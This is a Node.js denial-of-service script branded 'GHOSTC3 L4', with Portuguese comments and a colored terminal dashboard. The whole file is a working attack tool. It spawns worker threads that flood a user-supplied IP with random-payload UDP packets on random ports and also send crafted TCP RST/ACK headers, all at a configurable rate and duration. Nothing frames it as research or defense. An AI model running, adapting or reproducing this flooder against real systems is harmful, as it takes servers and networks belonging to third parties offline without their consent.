#!/usr/bin/env node
// ============================================================
//  GHOSTC3 L4 — PURE NODE (sem ffi-napi, sem koffi, sem libc)
//  UDP Flood + TCP-RST simulado via dgram + worker_threads
//  Uso: node script.js <ip> <time> <rps> <threads>
//  Porta: sempre aleatória (não precisa informar)
// ============================================================

'use strict';

const dgram = require('dgram');
const crypto = require('crypto');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const os = require('os');

// ============================================================
//  WORKER — roda em thread separada, envia pacotes sem travar
// ============================================================
if (!isMainThread) {
    const { IP, RPS, THREADS, ID } = workerData;

    const GOD_DATA = Buffer.from('f1a525da11f6', 'hex');
    const maxPerThread = Math.max(1, Math.floor(RPS / THREADS));

    const udp = dgram.createSocket('udp4');
    let localRps = 0;
    let lastTick = Date.now();
    let running = true;

    // buffer pré-alocado para evitar GC
    const pktBuf = Buffer.alloc(600);

    function randInt(min, max) {
        return crypto.randomInt(min, max + 1);
    }

    function loop() {
        if (!running) {
            try { udp.close(); } catch (e) {}
            return;
        }

        const now = Date.now();
        if (now - lastTick >= 1000) {
            lastTick = now;
            localRps = 0;
        }

        if (localRps < maxPerThread) {
            try {
                // ---- UDP flood ----
                const port = randInt(1, 65535);
                const size = randInt(64, 512);

                // data com "sabor" do God-Flood
                GOD_DATA.copy(pktBuf, 0);
                crypto.randomFillSync(pktBuf, GOD_DATA.length, size);

                udp.send(pktBuf, 0, GOD_DATA.length + size, port, IP, (err) => {
                    if (err) {
                        parentPort.postMessage({ type: 'err' });
                    } else {
                        parentPort.postMessage({ type: 'ok' });
                    }
                });

                // ---- TCP-RST simulado (mesmo checksum do SYBEX) ----
                const srcPort = randInt(1, 65535);
                const dstPort = randInt(1, 65535);
                const seq = randInt(10000, 99999);

                const tcp = Buffer.alloc(20);
                tcp.writeUInt16BE(srcPort, 0);
                tcp.writeUInt16BE(dstPort, 2);
                tcp.writeUInt32BE(seq, 4);
                tcp.writeUInt32BE(0, 8);
                tcp.writeUInt8(0x50, 12);          // doff=5
                tcp.writeUInt8(0x14, 13);          // RST|ACK
                tcp.writeUInt16BE(512, 14);        // window

                udp.send(tcp, 0, tcp.length, dstPort, IP, (err) => {
                    if (err) parentPort.postMessage({ type: 'err' });
                    else parentPort.postMessage({ type: 'ok' });
                });

                localRps += 2;
            } catch (e) {
                parentPort.postMessage({ type: 'err' });
            }
        }

        setImmediate(loop);
    }

    loop();

    parentPort.on('message', (msg) => {
        if (msg === 'stop') {
            running = false;
        }
    });
}

// ============================================================
//  MAIN — controla tudo, mostra painel, dispara workers
// ============================================================
else {
    const args = process.argv.slice(2);

    if (args.length < 4) {
        console.log('GHOSTC3 L4');
        console.error('Uso: node script.js <ip> <time> <rps> <threads>');
        process.exit(1);
    }

    const IP       = args[0];
    const TIME_SEC = parseInt(args[1], 10);
    const RPS      = parseInt(args[2], 10);
    const THREADS  = parseInt(args[3], 10);

    if (!IP || isNaN(TIME_SEC) || isNaN(RPS) || isNaN(THREADS) || THREADS < 1) {
        console.error('[!] Parâmetros inválidos.');
        process.exit(1);
    }

    // ---------------- estado ----------------
    const stats = {
        success: 0,
        error: 0,
        start: Date.now(),
        end: Date.now() + TIME_SEC * 1000,
        running: true,
    };

    // ---------------- cores ----------------
    const ESC = '\x1b[';
    const CLEAR = ESC + '2J' + ESC + 'H';
    const RED   = ESC + '91m';
    const GREEN = ESC + '92m';
    const CYAN  = ESC + '96m';
    const YEL   = ESC + '93m';
    const WHT   = ESC + '97m';
    const RST   = ESC + '0m';
    const BOLD  = ESC + '1m';
    const DIM   = ESC + '2m';

    function pad(n, w = 2) { return String(n).padStart(w, '0'); }

    function fmtTime(ms) {
        if (ms < 0) ms = 0;
        const s = Math.floor(ms / 1000);
        return `${pad(Math.floor(s / 3600))}:${pad(Math.floor((s % 3600) / 60))}:${pad(s % 60)}`;
    }

    let lastSuccess = 0;
    let lastError = 0;
    let lastTick = Date.now();
    let rpsNow = 0;

    // ---------------- painel ----------------
    function draw() {
        const now = Date.now();
        const elapsed = now - stats.start;
        const remaining = stats.end - now;

        if (now - lastTick >= 1000) {
            const dS = stats.success - lastSuccess;
            const dE = stats.error - lastError;
            rpsNow = dS + dE;
            lastSuccess = stats.success;
            lastError = stats.error;
            lastTick = now;
        }

        const total = stats.success + stats.error;
        const avgRps = elapsed > 0 ? (total / (elapsed / 1000)) : 0;

        let out = CLEAR;
        out += BOLD + CYAN + '╔══════════════════════════════════════════════════════════╗\n' + RST;
        out += BOLD + CYAN + '║' + RST + BOLD + WHT + '                GHOSTC3 L4 — PURE NODE                    ' + RST + BOLD + CYAN + '║\n' + RST;
        out += BOLD + CYAN + '╠══════════════════════════════════════════════════════════╣\n' + RST;
        out += BOLD + CYAN + '║' + RST + `  ${WHT}ALVO     :${RST} ${CYAN}${IP.padEnd(43)}${RST}` + BOLD + CYAN + '║\n' + RST;
        out += BOLD + CYAN + '║' + RST + `  ${WHT}THREADS  :${RST} ${CYAN}${String(THREADS).padEnd(43)}${RST}` + BOLD + CYAN + '║\n' + RST;
        out += BOLD + CYAN + '║' + RST + `  ${WHT}RPS      :${RST} ${CYAN}${String(RPS).padEnd(43)}${RST}` + BOLD + CYAN + '║\n' + RST;
        out += BOLD + CYAN + '╠══════════════════════════════════════════════════════════╣\n' + RST;
        out += BOLD + CYAN + '║' + RST + `  ${GREEN}SUCESSO  :${RST} ${GREEN}${String(stats.success).padEnd(43)}${RST}` + BOLD + CYAN + '║\n' + RST;
        out += BOLD + CYAN + '║' + RST + `  ${RED}ERRO     :${RST} ${RED}${String(stats.error).padEnd(43)}${RST}` + BOLD + CYAN + '║\n' + RST;
        out += BOLD + CYAN + '║' + RST + `  ${YEL}TIME     :${RST} ${YEL}${fmtTime(elapsed).padEnd(43)}${RST}` + BOLD + CYAN + '║\n' + RST;
        out += BOLD + CYAN + '║' + RST + `  ${WHT}RPS ATUAL:${RST} ${CYAN}${String(rpsNow.toFixed(0)).padEnd(43)}${RST}` + BOLD + CYAN + '║\n' + RST;
        out += BOLD + CYAN + '║' + RST + `  ${DIM}MEDIA    :${RST} ${DIM}${String(avgRps.toFixed(0)).padEnd(43)}${RST}` + BOLD + CYAN + '║\n' + RST;
        out += BOLD + CYAN + '╠══════════════════════════════════════════════════════════╣\n' + RST;
        out += BOLD + CYAN + '║' + RST + `  ${BOLD}${WHT}Resta de tempo Resta:${RST} ${BOLD}${YEL}${fmtTime(remaining).padEnd(27)}${RST}` + BOLD + CYAN + '║\n' + RST;
        out += BOLD + CYAN + '╚══════════════════════════════════════════════════════════╝\n' + RST;

        process.stdout.write(out);
    }

    const drawTimer = setInterval(draw, 200);

    // ---------------- workers ----------------
    const workers = [];

    function startWorkers() {
        const cpu = os.cpus().length;
        const realThreads = Math.min(THREADS, cpu * 4);

        for (let i = 0; i < realThreads; i++) {
            const w = new Worker(__filename, {
                workerData: { IP, RPS, THREADS: realThreads, ID: i },
            });

            w.on('message', (msg) => {
                if (msg.type === 'ok') stats.success++;
                else if (msg.type === 'err') stats.error++;
            });

            w.on('error', () => {
                stats.error++;
            });

            workers.push(w);
        }
    }

    function stopWorkers() {
        for (const w of workers) {
            try { w.postMessage('stop'); } catch (e) {}
            try { w.terminate(); } catch (e) {}
        }
    }

    // ---------------- shutdown ----------------
    let finished = false;

    function shutdown() {
        if (finished) return;
        finished = true;

        stats.running = false;
        clearInterval(drawTimer);
        clearInterval(endTimer);
        stopWorkers();

        draw();
        process.stdout.write('\n' + BOLD + GREEN + '[+] Finalizado.' + RST + '\n');
        process.exit(0);
    }

    process.on('SIGINT', shutdown);
    process.on('SIGTERM', shutdown);

    // ---------------- start ----------------
    console.log(BOLD + CYAN + '[+] GHOSTC3 L4 PURE NODE iniciado em ' + IP + RST);
    console.log(BOLD + WHT + '[+] Threads: ' + THREADS + ' | RPS: ' + RPS + ' | Tempo: ' + TIME_SEC + 's' + RST);

    startWorkers();

    const endTimer = setInterval(() => {
        if (Date.now() >= stats.end) {
            shutdown();
        }
    }, 200);
}
